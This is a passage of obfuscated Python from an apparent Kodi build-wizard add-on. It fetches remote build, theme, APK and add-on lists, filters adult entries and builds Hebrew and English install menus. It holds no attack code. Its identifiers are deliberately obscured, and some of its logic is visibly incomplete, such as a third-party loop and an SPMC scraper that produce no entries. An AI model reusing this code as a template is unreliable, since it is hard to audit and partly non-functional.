		OO0OO00OO0O0OO00O ,O000O0O0OO000OO0O ,OO0OOO0O00OO0OO0O ,O0OOOOO00O0000O0O ,O0OOO0O00O00OOOO0 ,O00OO00O0O0O0O000 ,OO00O0OO0O0O0O0O0 =wiz .buildCount ()#line:2215
		OO0OO0OO0O0O0O0OO =False ;O0OO0O0O0OOOO0O0O =[]#line:2216
		if THIRDPARTY =='true':#line:2217
			if not THIRD1NAME ==''and not THIRD1URL =='':OO0OO0OO0O0O0O0OO =True ;O0OO0O0O0OOOO0O0O .append ('1')#line:2218
			if not THIRD2NAME ==''and not THIRD2URL =='':OO0OO0OO0O0O0O0OO =True ;O0OO0O0O0OOOO0O0O .append ('2')#line:2219
			if not THIRD3NAME ==''and not THIRD3URL =='':OO0OO0OO0O0O0O0OO =True ;O0OO0O0O0OOOO0O0O .append ('3')#line:2220
		O0000O0O000000O00 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2221
		OO0O00O00000OO0O0 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0000O0O000000O00 )#line:2222
		if OO0OO00OO0O0OO00O ==1 and OO0OO0OO0O0O0O0OO ==False :#line:2223
			for O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ,O0OOO00000O0O00OO ,OO0OOO000O000O000 ,O0OOO00O0OOO000OO ,OOO0OOOOO0OO0O0O0 ,OOOO0O0O0OOOO00OO ,O0O000OOO00000OOO ,O0OOO0000O0OO0O00 ,OO0OO00O0O00000O0 in OO0O00O00000OO0O0 :#line:2224
				if not SHOWADULT =='true'and O0OOO0000O0OO0O00 .lower ()=='yes':continue #line:2225
				if not DEVELOPER =='true'and wiz .strTest (O0000OOOO00OOOO0O ):continue #line:2226
				viewBuild (OO0O00O00000OO0O0 [0 ][0 ])#line:2227
				return #line:2228
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2231
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2232
		if OO0OO0OO0O0O0O0OO ==True :#line:2233
			for OO0OO00OO0OO00OO0 in O0OO0O0O0OOOO0O0O :#line:2234
				O0000OOOO00OOOO0O =eval ('THIRD%sNAME'%OO0OO00OO0OO00OO0 )#line:2235
		if len (OO0O00O00000OO0O0 )>=1 :#line:2237
			if SEPERATE =='true':#line:2238
				for O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ,O0OOO00000O0O00OO ,OO0OOO000O000O000 ,O0OOO00O0OOO000OO ,OOO0OOOOO0OO0O0O0 ,OOOO0O0O0OOOO00OO ,O0O000OOO00000OOO ,O0OOO0000O0OO0O00 ,OO0OO00O0O00000O0 in OO0O00O00000OO0O0 :#line:2239
					if not SHOWADULT =='true'and O0OOO0000O0OO0O00 .lower ()=='yes':continue #line:2240
					if not DEVELOPER =='true'and wiz .strTest (O0000OOOO00OOOO0O ):continue #line:2241
					OO000OO0O0OO000OO =createMenu ('install','',O0000OOOO00OOOO0O )#line:2242
					addDir ('[%s] %s (v%s)'%(float (O0OOO00O0OOO000OO ),O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ),'viewbuild',O0000OOOO00OOOO0O ,description =OO0OO00O0O00000O0 ,fanart =O0O000OOO00000OOO ,icon =OOOO0O0O0OOOO00OO ,menu =OO000OO0O0OO000OO ,themeit =THEME2 )#line:2243
			else :#line:2244
				if O0OOOOO00O0000O0O >0 :#line:2245
					OO0O0O0OO000000O0 ='+'if SHOW17 =='false'else '-'#line:2246
					if SHOW17 =='true':#line:2248
						for O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ,O0OOO00000O0O00OO ,OO0OOO000O000O000 ,O0OOO00O0OOO000OO ,OOO0OOOOO0OO0O0O0 ,OOOO0O0O0OOOO00OO ,O0O000OOO00000OOO ,O0OOO0000O0OO0O00 ,OO0OO00O0O00000O0 in OO0O00O00000OO0O0 :#line:2250
							if not SHOWADULT =='true'and O0OOO0000O0OO0O00 .lower ()=='yes':continue #line:2251
							if not DEVELOPER =='true'and wiz .strTest (O0000OOOO00OOOO0O ):continue #line:2252
							OO0OOOOO0OO0O000O =int (float (O0OOO00O0OOO000OO ))#line:2253
							if OO0OOOOO0OO0O000O ==17 :#line:2254
								OO000OO0O0OO000OO =createMenu ('install','',O0000OOOO00OOOO0O )#line:2255
								addDir ('[%s] %s (v%s)'%(float (O0OOO00O0OOO000OO ),O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ),'viewbuild',O0000OOOO00OOOO0O ,description =OO0OO00O0O00000O0 ,fanart =O0O000OOO00000OOO ,icon =OOOO0O0O0OOOO00OO ,menu =OO000OO0O0OO000OO ,themeit =THEME2 )#line:2256
				if O0OOO0O00O00OOOO0 >0 :#line:2257
					OO0O0O0OO000000O0 ='+'if SHOW18 =='false'else '-'#line:2258
					if SHOW18 =='true':#line:2260
						for O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ,O0OOO00000O0O00OO ,OO0OOO000O000O000 ,O0OOO00O0OOO000OO ,OOO0OOOOO0OO0O0O0 ,OOOO0O0O0OOOO00OO ,O0O000OOO00000OOO ,O0OOO0000O0OO0O00 ,OO0OO00O0O00000O0 in OO0O00O00000OO0O0 :#line:2262
							if not SHOWADULT =='true'and O0OOO0000O0OO0O00 .lower ()=='yes':continue #line:2263
							if not DEVELOPER =='true'and wiz .strTest (O0000OOOO00OOOO0O ):continue #line:2264
							OO0OOOOO0OO0O000O =int (float (O0OOO00O0OOO000OO ))#line:2265
							if OO0OOOOO0OO0O000O ==18 :#line:2266
								OO000OO0O0OO000OO =createMenu ('install','',O0000OOOO00OOOO0O )#line:2267
								addDir ('[%s] %s (v%s)'%(float (O0OOO00O0OOO000OO ),O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ),'viewbuild',O0000OOOO00OOOO0O ,description =OO0OO00O0O00000O0 ,fanart =O0O000OOO00000OOO ,icon =OOOO0O0O0OOOO00OO ,menu =OO000OO0O0OO000OO ,themeit =THEME2 )#line:2268
				if OO0OOO0O00OO0OO0O >0 :#line:2269
					OO0O0O0OO000000O0 ='+'if SHOW16 =='false'else '-'#line:2270
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OO0O0O0OO000000O0 ,OO0OOO0O00OO0OO0O ),'togglesetting','show16',themeit =THEME3 )#line:2271
					if SHOW16 =='true':#line:2272
						for O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ,O0OOO00000O0O00OO ,OO0OOO000O000O000 ,O0OOO00O0OOO000OO ,OOO0OOOOO0OO0O0O0 ,OOOO0O0O0OOOO00OO ,O0O000OOO00000OOO ,O0OOO0000O0OO0O00 ,OO0OO00O0O00000O0 in OO0O00O00000OO0O0 :#line:2273
							if not SHOWADULT =='true'and O0OOO0000O0OO0O00 .lower ()=='yes':continue #line:2274
							if not DEVELOPER =='true'and wiz .strTest (O0000OOOO00OOOO0O ):continue #line:2275
							OO0OOOOO0OO0O000O =int (float (O0OOO00O0OOO000OO ))#line:2276
							if OO0OOOOO0OO0O000O ==16 :#line:2277
								OO000OO0O0OO000OO =createMenu ('install','',O0000OOOO00OOOO0O )#line:2278
								addDir ('[%s] %s (v%s)'%(float (O0OOO00O0OOO000OO ),O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ),'viewbuild',O0000OOOO00OOOO0O ,description =OO0OO00O0O00000O0 ,fanart =O0O000OOO00000OOO ,icon =OOOO0O0O0OOOO00OO ,menu =OO000OO0O0OO000OO ,themeit =THEME2 )#line:2279
				if O000O0O0OO000OO0O >0 :#line:2280
					OO0O0O0OO000000O0 ='+'if SHOW15 =='false'else '-'#line:2281
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OO0O0O0OO000000O0 ,O000O0O0OO000OO0O ),'togglesetting','show15',themeit =THEME3 )#line:2282
					if SHOW15 =='true':#line:2283
						for O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ,O0OOO00000O0O00OO ,OO0OOO000O000O000 ,O0OOO00O0OOO000OO ,OOO0OOOOO0OO0O0O0 ,OOOO0O0O0OOOO00OO ,O0O000OOO00000OOO ,O0OOO0000O0OO0O00 ,OO0OO00O0O00000O0 in OO0O00O00000OO0O0 :#line:2284
							if not SHOWADULT =='true'and O0OOO0000O0OO0O00 .lower ()=='yes':continue #line:2285
							if not DEVELOPER =='true'and wiz .strTest (O0000OOOO00OOOO0O ):continue #line:2286
							OO0OOOOO0OO0O000O =int (float (O0OOO00O0OOO000OO ))#line:2287
							if OO0OOOOO0OO0O000O <=15 :#line:2288
								OO000OO0O0OO000OO =createMenu ('install','',O0000OOOO00OOOO0O )#line:2289
								addDir ('[%s] %s (v%s)'%(float (O0OOO00O0OOO000OO ),O0000OOOO00OOOO0O ,OO00OO0O0O0O0OOO0 ),'viewbuild',O0000OOOO00OOOO0O ,description =OO0OO00O0O00000O0 ,fanart =O0O000OOO00000OOO ,icon =OOOO0O0O0OOOO00OO ,menu =OO000OO0O0OO000OO ,themeit =THEME2 )#line:2290
		elif OO00O0OO0O0O0O0O0 >0 :#line:2291
			if O00OO00O0O0O0O000 >0 :#line:2292
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2293
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2294
			else :#line:2295
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
	setView ('files','viewType')#line:2298
def viewBuild (O000OOOO0OO00O000 ):#line:2300
	OOO00OO0OO0O0O0OO =wiz .workingURL (SPEEDFILE )#line:2301
	if not OOO00OO0OO0O0O0OO ==True :#line:2302
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2303
		addFile ('%s'%OOO00OO0OO0O0O0OO ,'',themeit =THEME3 )#line:2304
		return #line:2305
	if wiz .checkBuild (O000OOOO0OO00O000 ,'version')==False :#line:2306
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2307
		addFile ('%s was not found in the builds list.'%O000OOOO0OO00O000 ,'',themeit =THEME3 )#line:2308
		return #line:2309
	OO0OOO0OO0O0000OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2310
	O0OOO0OO0000O00O0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000OOOO0OO00O000 ).findall (OO0OOO0OO0O0000OO )#line:2311
	for O00O0O0000O0000OO ,O000O0O0OOO00OO0O ,O0OO00000O00O00O0 ,OOO0O00O00OOO0O00 ,O0O000OOOO0O000O0 ,O00OO0OOO0O0000OO ,OOO00OOOO0OOO0O00 ,OO0000O0OO0O0O0O0 ,OO00O0O0O0OO000OO ,OO00OO000OOO00O00 in O0OOO0OO0000O00O0 :#line:2312
		O00OO0OOO0O0000OO =O00OO0OOO0O0000OO if wiz .workingURL (O00OO0OOO0O0000OO )else ICON #line:2313
		OOO00OOOO0OOO0O00 =OOO00OOOO0OOO0O00 if wiz .workingURL (OOO00OOOO0OOO0O00 )else FANART #line:2314
		OO0OOOO00OOOO0O00 ='%s (v%s)'%(O000OOOO0OO00O000 ,O00O0O0000O0000OO )#line:2315
		if BUILDNAME ==O000OOOO0OO00O000 and O00O0O0000O0000OO >BUILDVERSION :#line:2316
			OO0OOOO00OOOO0O00 ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0OOOO00OOOO0O00 ,BUILDVERSION )#line:2317
		OO0OO000O0OOO0O0O =int (float (KODIV ));OO00OOOO0OOO0OOO0 =int (float (OOO0O00O00OOO0O00 ))#line:2326
		if not OO0OO000O0OOO0O0O ==OO00OOOO0OOO0OOO0 :#line:2327
			if OO0OO000O0OOO0O0O ==16 and OO00OOOO0OOO0OOO0 <=15 :OO0OO0OOO00000O00 =False #line:2328
			else :OO0OO0OOO00000O00 =True #line:2329
		else :OO0OO0OOO00000O00 =False #line:2330
		addFile ('התקנה','install',O000OOOO0OO00O000 ,'fresh',description =OO00OO000OOO00O00 ,fanart =OOO00OOOO0OOO0O00 ,icon =O00OO0OOO0O0000OO ,themeit =THEME1 )#line:2334
		if not O0O000OOOO0O000O0 =='http://':#line:2337
			if wiz .workingURL (O0O000OOOO0O000O0 )==True :#line:2338
				addFile (wiz .sep ('THEMES'),'',fanart =OOO00OOOO0OOO0O00 ,icon =O00OO0OOO0O0000OO ,themeit =THEME3 )#line:2339
				OO0OOO0OO0O0000OO =wiz .openURL (O0O000OOOO0O000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2340
				O0OOO0OO0000O00O0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OOO0OO0O0000OO )#line:2341
				for O000OOO0OOO0OOO00 ,O00OO0O0O00O000O0 ,OOO000OOO00OO00OO ,O0000O0OO0O0OOOO0 ,OO00O00OOO00OOOOO ,OO00OO000OOO00O00 in O0OOO0OO0000O00O0 :#line:2342
					if not SHOWADULT =='true'and OO00O00OOO00OOOOO .lower ()=='yes':continue #line:2343
					OOO000OOO00OO00OO =OOO000OOO00OO00OO if OOO000OOO00OO00OO =='http://'else O00OO0OOO0O0000OO #line:2344
					O0000O0OO0O0OOOO0 =O0000O0OO0O0OOOO0 if O0000O0OO0O0OOOO0 =='http://'else OOO00OOOO0OOO0O00 #line:2345
					addFile (O000OOO0OOO0OOO00 if not O000OOO0OOO0OOO00 ==BUILDTHEME else "[B]%s (Installed)[/B]"%O000OOO0OOO0OOO00 ,'theme',O000OOOO0OO00O000 ,O000OOO0OOO0OOO00 ,description =OO00OO000OOO00O00 ,fanart =O0000O0OO0O0OOOO0 ,icon =OOO000OOO00OO00OO ,themeit =THEME3 )#line:2346
	setView ('files','viewType')#line:2347
def viewThirdList (O0OOO0OO0OOOOOO0O ):#line:2349
	O0O0OOOO0O00O00O0 =eval ('THIRD%sNAME'%O0OOO0OO0OOOOOO0O )#line:2350
	O0000OO000OOO0000 =eval ('THIRD%sURL'%O0OOO0OO0OOOOOO0O )#line:2351
	O0O0O000O000OO00O =wiz .workingURL (O0000OO000OOO0000 )#line:2352
	if not O0O0O000O000OO00O ==True :#line:2353
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2354
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2355
	else :#line:2356
		OO0O00OO00000O000 ,O0OO0O0O0OOOO0O00 =wiz .thirdParty (O0000OO000OOO0000 )#line:2357
		addFile ("[B]%s[/B]"%O0O0OOOO0O00O00O0 ,'',themeit =THEME3 )#line:2358
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2359
		if OO0O00OO00000O000 :#line:2360
			for O0O0OOOO0O00O00O0 ,O00OO0O0OOO0O0000 ,O0000OO000OOO0000 ,O0OO00OO0OOO0OO0O ,OOO0O00000O00O0O0 ,O00000O00O00OOOOO ,OOO0000O0O000O00O ,O0OOO0O00OOOO00O0 in O0OO0O0O0OOOO0O00 :#line:2361
				if not SHOWADULT =='true'and OOO0000O0O000O00O .lower ()=='yes':continue #line:2362
				addFile ("[%s] %s v%s"%(O0OO00OO0OOO0OO0O ,O0O0OOOO0O00O00O0 ,O00OO0O0OOO0O0000 ),'installthird',O0O0OOOO0O00O00O0 ,O0000OO000OOO0000 ,icon =OOO0O00000O00O0O0 ,fanart =O00000O00O00OOOOO ,description =O0OOO0O00OOOO00O0 ,themeit =THEME2 )#line:2363
		else :#line:2364
			for O0O0OOOO0O00O00O0 ,O0000OO000OOO0000 ,OOO0O00000O00O0O0 ,O00000O00O00OOOOO ,O0OOO0O00OOOO00O0 in O0OO0O0O0OOOO0O00 :#line:2365
				addFile (O0O0OOOO0O00O00O0 ,'installthird',O0O0OOOO0O00O00O0 ,O0000OO000OOO0000 ,icon =OOO0O00000O00O0O0 ,fanart =O00000O00O00OOOOO ,description =O0OOO0O00OOOO00O0 ,themeit =THEME2 )#line:2366
def editThirdParty (OO00O00OOO0O0O0O0 ):#line:2368
	O00OOOO0O0O000OOO =eval ('THIRD%sNAME'%OO00O00OOO0O0O0O0 )#line:2369
	OO0OO0000000O00OO =eval ('THIRD%sURL'%OO00O00OOO0O0O0O0 )#line:2370
	O00OO00O00O000OO0 =wiz .getKeyboard (O00OOOO0O0O000OOO ,'Enter the Name of the Wizard')#line:2371
	O0OO0O0O0000OOO0O =wiz .getKeyboard (OO0OO0000000O00OO ,'Enter the URL of the Wizard Text')#line:2372
	wiz .setS ('wizard%sname'%OO00O00OOO0O0O0O0 ,O00OO00O00O000OO0 )#line:2374
	wiz .setS ('wizard%surl'%OO00O00OOO0O0O0O0 ,O0OO0O0O0000OOO0O )#line:2375
def apkScraper (name =""):#line:2377
	if name =='kodi':#line:2378
		O0O0O0OO000000000 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2379
		OO0O0O00O00000OOO ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2380
		OOOO0OO0O0OOO0OOO =wiz .openURL (O0O0O0OO000000000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2381
		OOO0O0O0O0000OO00 =wiz .openURL (OO0O0O00O00000OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2382
		OOOOOO00O0000OOO0 =0 #line:2383
		O0O0OO00O00O0OO00 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOO0OO0O0OOO0OOO )#line:2384
		O000OOO00OO0OOO0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOO0O0O0O0000OO00 )#line:2385
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2387
		O0OO00OOOO000OO0O =False #line:2388
		for OOO00O0OO000O0OOO ,name ,O0000O0OO00OO0O0O ,OOOOO000O0OO0O00O in O0O0OO00O00O0OO00 :#line:2389
			if OOO00O0OO000O0OOO in ['../','old/']:continue #line:2390
			if not OOO00O0OO000O0OOO .endswith ('.apk'):continue #line:2391
			if not OOO00O0OO000O0OOO .find ('_')==-1 and O0OO00OOOO000OO0O ==True :continue #line:2392
			try :#line:2393
				O0O0O00OOO00OO000 =name .split ('-')#line:2394
				if not OOO00O0OO000O0OOO .find ('_')==-1 :#line:2395
					O0OO00OOOO000OO0O =True #line:2396
					OOOOO0O00OOOO00O0 ,O0O0OO0OO0OO0OOO0 =O0O0O00OOO00OO000 [2 ].split ('_')#line:2397
				else :#line:2398
					OOOOO0O00OOOO00O0 =O0O0O00OOO00OO000 [2 ]#line:2399
					O0O0OO0OO0OO0OOO0 =''#line:2400
				O0OO0000000O00O00 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00OOO00OO000 [0 ].title (),O0O0O00OOO00OO000 [1 ],O0O0OO0OO0OO0OOO0 .upper (),OOOOO0O00OOOO00O0 ,COLOR2 ,O0000O0OO00OO0O0O .replace (' ',''),COLOR1 ,OOOOO000O0OO0O00O )#line:2401
				O00OO0O00O0OOO00O =urljoin (O0O0O0OO000000000 ,OOO00O0OO000O0OOO )#line:2402
				addFile (O0OO0000000O00O00 ,'apkinstall',"%s v%s%s %s"%(O0O0O00OOO00OO000 [0 ].title (),O0O0O00OOO00OO000 [1 ],O0O0OO0OO0OO0OOO0 .upper (),OOOOO0O00OOOO00O0 ),O00OO0O00O0OOO00O )#line:2403
				OOOOOO00O0000OOO0 +=1 #line:2404
			except :#line:2405
				wiz .log ("Error on: %s"%name )#line:2406
		for OOO00O0OO000O0OOO ,name ,O0000O0OO00OO0O0O ,OOOOO000O0OO0O00O in O000OOO00OO0OOO0O :#line:2408
			if OOO00O0OO000O0OOO in ['../','old/']:continue #line:2409
			if not OOO00O0OO000O0OOO .endswith ('.apk'):continue #line:2410
			if not OOO00O0OO000O0OOO .find ('_')==-1 :continue #line:2411
			try :#line:2412
				O0O0O00OOO00OO000 =name .split ('-')#line:2413
				O0OO0000000O00O00 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0O00OOO00OO000 [0 ].title (),O0O0O00OOO00OO000 [1 ],O0O0O00OOO00OO000 [2 ],COLOR2 ,O0000O0OO00OO0O0O .replace (' ',''),COLOR1 ,OOOOO000O0OO0O00O )#line:2414
				O00OO0O00O0OOO00O =urljoin (OO0O0O00O00000OOO ,OOO00O0OO000O0OOO )#line:2415
				addFile (O0OO0000000O00O00 ,'apkinstall',"%s v%s %s"%(O0O0O00OOO00OO000 [0 ].title (),O0O0O00OOO00OO000 [1 ],O0O0O00OOO00OO000 [2 ]),O00OO0O00O0OOO00O )#line:2416
				OOOOOO00O0000OOO0 +=1 #line:2417
			except :#line:2418
				wiz .log ("Error on: %s"%name )#line:2419
		if OOOOOO00O0000OOO0 ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2420
	elif name =='spmc':#line:2421
		OOO0O000O000O0OOO ='https://github.com/koying/SPMC/releases'#line:2422
		OOOO0OO0O0OOO0OOO =wiz .openURL (OOO0O000O000O0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2423
		OOOOOO00O0000OOO0 =0 #line:2424
		O0O0OO00O00O0OO00 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOO0OO0O0OOO0OOO )#line:2425
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2427
		for name ,O0OOO0000O0O000OO in O0O0OO00O00O0OO00 :#line:2429
			O0O000OOOOOOOO0O0 =''#line:2430
			O000OOO00OO0OOO0O =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O0OOO0000O0O000OO )#line:2431
			for O0OOOO00OO000O0OO ,OOO0OOO000O0OO0OO ,O0O0000OOOOOO00O0 in O000OOO00OO0OOO0O :#line:2432
				if O0O0000OOOOOO00O0 .find ('armeabi')==-1 :continue #line:2433
				if O0O0000OOOOOO00O0 .find ('launcher')>-1 :continue #line:2434
				O0O000OOOOOOOO0O0 =urljoin ('https://github.com',O0OOOO00OO000O0OO )#line:2435
				break #line:2436
		if OOOOOO00O0000OOO0 ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2438
def apkMenu (url =None ):#line:2440
	if url ==None :#line:2441
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2444
	if not APKFILE =='http://':#line:2445
		if url ==None :#line:2446
			OOO0O000OOO00O00O =wiz .workingURL (APKFILE )#line:2447
			OO0O00O0OO0OO0OOO =uservar .APKFILE #line:2448
		else :#line:2449
			OOO0O000OOO00O00O =wiz .workingURL (url )#line:2450
			OO0O00O0OO0OO0OOO =url #line:2451
		if OOO0O000OOO00O00O ==True :#line:2452
			OOO00OO0OO00OOOOO =wiz .openURL (OO0O00O0OO0OO0OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2453
			OOO0O0OO00O0O000O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOO00OO0OO00OOOOO )#line:2454
			if len (OOO0O0OO00O0O000O )>0 :#line:2455
				O00O000O0OO0OO00O =0 #line:2456
				for O00O00OO0OOO00O0O ,OOOOO0OO0OOOOO0OO ,url ,OO0000000OOOO0O0O ,O000O0O0OO0000OOO ,O0O0OO0O00O00O0O0 ,OO0OO0OOO0000O000 in OOO0O0OO00O0O000O :#line:2457
					if not SHOWADULT =='true'and O0O0OO0O00O00O0O0 .lower ()=='yes':continue #line:2458
					if OOOOO0OO0OOOOO0OO .lower ()=='yes':#line:2459
						O00O000O0OO0OO00O +=1 #line:2460
						addDir ("[B]%s[/B]"%O00O00OO0OOO00O0O ,'apk',url ,description =OO0OO0OOO0000O000 ,icon =OO0000000OOOO0O0O ,fanart =O000O0O0OO0000OOO ,themeit =THEME3 )#line:2461
					else :#line:2462
						O00O000O0OO0OO00O +=1 #line:2463
						addFile (O00O00OO0OOO00O0O ,'apkinstall',O00O00OO0OOO00O0O ,url ,description =OO0OO0OOO0000O000 ,icon =OO0000000OOOO0O0O ,fanart =O000O0O0OO0000OOO ,themeit =THEME2 )#line:2464
					if O00O000O0OO0OO00O <1 :#line:2465
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2466
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2467
		else :#line:2468
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2469
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2470
			addFile ('%s'%OOO0O000OOO00O00O ,'',themeit =THEME3 )#line:2471
		return #line:2472
	else :wiz .log ("[APK Menu] No APK list added.")#line:2473
	setView ('files','viewType')#line:2474
def addonMenu (url =None ):#line:2476
	if not ADDONFILE =='http://':#line:2477
		if url ==None :#line:2478
			O00000OO0OO0OO00O =wiz .workingURL (ADDONFILE )#line:2479
			OO00000OOOO0000OO =uservar .ADDONFILE #line:2480
		else :#line:2481
			O00000OO0OO0OO00O =wiz .workingURL (url )#line:2482
			OO00000OOOO0000OO =url #line:2483
		if O00000OO0OO0OO00O ==True :#line:2484
			OO0OO0O0OO0OOO0O0 =wiz .openURL (OO00000OOOO0000OO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2485
			OOOOOO0OOOOOOOO00 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO0O0OO0OOO0O0 )#line:2486
			if len (OOOOOO0OOOOOOOO00 )>0 :#line:2487
				OO0O000OO0O0O0000 =0 #line:2488
				for O000000OOO00000OO ,O0O0O0O0OO00000O0 ,url ,O00OO00OO0OOO0OOO ,OOOOO000OO0000OOO ,O00O0O0O00000O00O ,O0OO00OOO0OOOOOOO ,O000OOOO00O0O0O00 ,OOOO0O0O00OO00000 ,OO00OO000O000OOO0 in OOOOOO0OOOOOOOO00 :#line:2489
					if O0O0O0O0OO00000O0 .lower ()=='section':#line:2490
						OO0O000OO0O0O0000 +=1 #line:2491
						addDir ("[B]%s[/B]"%O000000OOO00000OO ,'addons',url ,description =OO00OO000O000OOO0 ,icon =O0OO00OOO0OOOOOOO ,fanart =O000OOOO00O0O0O00 ,themeit =THEME3 )#line:2492
					else :#line:2493
						if not SHOWADULT =='true'and OOOO0O0O00OO00000 .lower ()=='yes':continue #line:2494
						try :#line:2495
							OO0O0O000O00000OO =xbmcaddon .Addon (id =O0O0O0O0OO00000O0 ).getAddonInfo ('path')#line:2496
							if os .path .exists (OO0O0O000O00000OO ):#line:2497
								O000000OOO00000OO ="[COLOR green][Installed][/COLOR] %s"%O000000OOO00000OO #line:2498
						except :#line:2499
							pass #line:2500
						OO0O000OO0O0O0000 +=1 #line:2501
						addFile (O000000OOO00000OO ,'addoninstall',O0O0O0O0OO00000O0 ,OO00000OOOO0000OO ,description =OO00OO000O000OOO0 ,icon =O0OO00OOO0OOOOOOO ,fanart =O000OOOO00O0O0O00 ,themeit =THEME2 )#line:2502
					if OO0O000OO0O0O0000 <1 :#line:2503
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2504
			else :#line:2505
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2506
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2507
		else :#line:2508
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2509
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2510
			addFile ('%s'%O00000OO0OO0OO00O ,'',themeit =THEME3 )#line:2511
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2512
	setView ('files','viewType')#line:2513
def addonInstaller (OO0O000000O0O0OOO ,OOOO00OOOOOO00000 ):#line:2515
	if not ADDONFILE =='http://':#line:2516
		O0OO00O0O000OO00O =wiz .workingURL (OOOO00OOOOOO00000 )#line:2517
		if O0OO00O0O000OO00O ==True :#line:2518
			O0000000O00000OO0 =wiz .openURL (OOOO00OOOOOO00000 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2519
